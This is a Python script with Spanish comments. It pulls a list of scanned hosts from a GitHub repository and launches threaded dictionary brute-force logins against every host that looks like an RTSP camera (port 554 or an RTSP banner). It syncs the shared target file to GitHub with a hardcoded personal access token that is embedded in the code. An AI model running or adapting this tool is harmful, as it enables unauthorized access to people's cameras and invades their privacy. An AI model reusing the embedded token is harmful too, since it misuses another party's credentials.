import json
import requests
import base64
import os
from queue import Queue
from http.server import SimpleHTTPRequestHandler, HTTPServer
import threading
import time
from watchdog.observers import Observer
from watchdog.events import FileSystemEventHandler
from rtspBrute import RTSPBruteModule
from common import cargar_datos, actualizar_datos
import re

# Configuración de GitHub
GITHUB_TOKEN = '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'  # Token de acceso personal de GitHub
REPO_OWNER = 'TreonSearch'         # Propietario del repositorio
REPO_NAME = 'Tron_Json'            # Nombre del repositorio
FILE_PATH = 'datos.json'           # Ruta al archivo JSON
FILE_NAME = 'datos.json'           # Nombre del archivo en GitHub

def reparar_json_malformado(file_path):
    """Reparar el archivo JSON eliminando líneas hasta encontrar el cierre de un objeto, 
       y luego agregar el corchete de cierre ']'."""
    while True:
        try:
            if not os.path.exists(file_path):
                print(f"El archivo {file_path} no existe. Se creará un archivo vacío.")
                with open(file_path, 'w', encoding='utf-8') as file:
                    file.write("[]\n")
                print(f"El archivo vacío ha sido creado en {file_path}.")
                return
            elif os.path.getsize(file_path) < 5:
                print(f"El archivo {file_path} parece estar vacío o con tamaño muy pequeño, será reparado.")
                with open(file_path, 'w', encoding='utf-8') as file:
                    file.write("[]\n")
                print(f"El archivo vacío ha sido creado en {file_path}.")
                return

            with open(file_path, 'r', encoding='utf-8') as file:
                lines = file.readlines()

            found_preview = False
            while lines:
                if '"Preview": null' in lines[-1]:
                    found_preview = True
                    break
                lines.pop()

            if found_preview:
                if not lines[-1].strip().endswith('}'):
                    lines.append("}\n")
                lines.append("]\n")

                with open(file_path, 'w', encoding='utf-8') as file:
                    file.writelines(lines)

                print(f"Archivo JSON reparado y guardado en {file_path}.")
                break

        except json.JSONDecodeError:
            print(f"Error al analizar el JSON en {file_path}. Intentando reparar línea por línea...")
            time.sleep(1)
        except Exception as e:
            print(f"Ocurrió un error al reparar el JSON: {e}")
            break

def download_from_github():
    """Descargar el archivo datos.json desde GitHub si es más grande que el archivo local."""
    url = f'https://api.github.com/repos/{REPO_OWNER}/{REPO_NAME}/contents/{FILE_NAME}'
    headers = {'Authorization': f'token {GITHUB_TOKEN}'}
    
    response = requests.get(url, headers=headers)
    
    if response.status_code == 200:
        remote_size = response.json()['size']
        print(f'Tamaño del archivo remoto: {remote_size} bytes')

        if os.path.exists(FILE_PATH):
            local_size = os.path.getsize(FILE_PATH)
            print(f'Tamaño del archivo local: {local_size} bytes')

            if remote_size > local_size:
                download_url = response.json()['download_url']
                print("El archivo remoto es más grande, descargando...")

                download_response = requests.get(download_url)
                with open(FILE_PATH, 'wb') as file:
                    file.write(download_response.content)
                print("Archivo descargado exitosamente desde GitHub.")
        else:
            print("El archivo local no existe, descargando el archivo remoto.")
            download_url = response.json()['download_url']
            download_response = requests.get(download_url)
            with open(FILE_PATH, 'wb') as file:
                file.write(download_response.content)
            print("Archivo descargado exitosamente desde GitHub.")
    else:
        print(f"Error al obtener el archivo de GitHub: {response.content}")

def upload_to_github():
    """Subir el archivo datos.json a GitHub."""
    with open(FILE_PATH, 'r') as file:
        content = file.read()

    encoded_content = base64.b64encode(content.encode()).decode()

    url = f'https://api.github.com/repos/{REPO_OWNER}/{REPO_NAME}/contents/{FILE_NAME}'
    headers = {'Authorization': f'token {GITHUB_TOKEN}'}

    response = requests.get(url, headers=headers)
    
    if response.status_code == 200:
        sha = response.json()['sha']
        data = {
            'message': 'Actualización del archivo datos.json',
            'content': encoded_content,
            'sha': sha,
            'branch': 'main'
        }
    else:
        data = {
            'message': 'Subida del archivo datos.json',
            'content': encoded_content,
            'branch': 'main'
        }

    response = requests.put(url, headers=headers, json=data)

    if response.status_code == 201 or response.status_code == 200:
        print("Archivo subido/actualizado correctamente.")
    else:
        print(f"Error al subir el archivo: {response.content}")

class ChangeHandler(FileSystemEventHandler):
    """Clase que maneja los cambios en el archivo datos.json."""
    def on_modified(self, event):
        if event.src_path == os.path.abspath(FILE_PATH):
            print(f"El archivo {FILE_PATH} ha sido modificado. Actualizando servidor...")
            reparar_json_malformado(FILE_PATH)
            upload_to_github()

def brute_force_worker(q, dictionary_file):
    while True:
        target = q.get()
        if target is None:
            break
        ip, port = target
        brute = RTSPBruteModule()
        brute.setup(targets=[(ip, port)], dictionary_file=dictionary_file)
        brute.run()
        q.task_done()

def start_http_server():
    port = 8080
    server_address = ('', port)
    httpd = HTTPServer(server_address, SimpleHTTPRequestHandler)
    print(f'Servidor iniciado en http://127.0.0.1:{port}')

    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        print("Servidor detenido.")
        httpd.server_close()

if __name__ == '__main__':
    # Iniciar el servidor HTTP en un hilo para que funcione en paralelo
    server_thread = threading.Thread(target=start_http_server, daemon=True)
    server_thread.start()

    # Descargar el archivo desde GitHub si es necesario
    download_from_github()

    # Reparar el archivo JSON
    reparar_json_malformado(FILE_PATH)

    # Subir el archivo a GitHub
    upload_to_github()

    with open(FILE_PATH, 'r', encoding='utf-8') as file:
        json_data = file.read()

    try:
        data = json.loads(json_data)
    except json.JSONDecodeError as e:
        print(f"Error al analizar el JSON: {e}")
        exit(1)

    targets = [(entry['IP'], entry['Puerto']) for entry in data if 'RTSP' in entry.get('Banner', '') or entry.get('Puerto') == 554]

    q = Queue()

    for target in targets:
        q.put(target)

    dictionary_file = "diccionario.txt"
    num_worker_threads = 4
    for _ in range(num_worker_threads):
        threading.Thread(target=brute_force_worker, args=(q, dictionary_file), daemon=True).start()

    q.join()
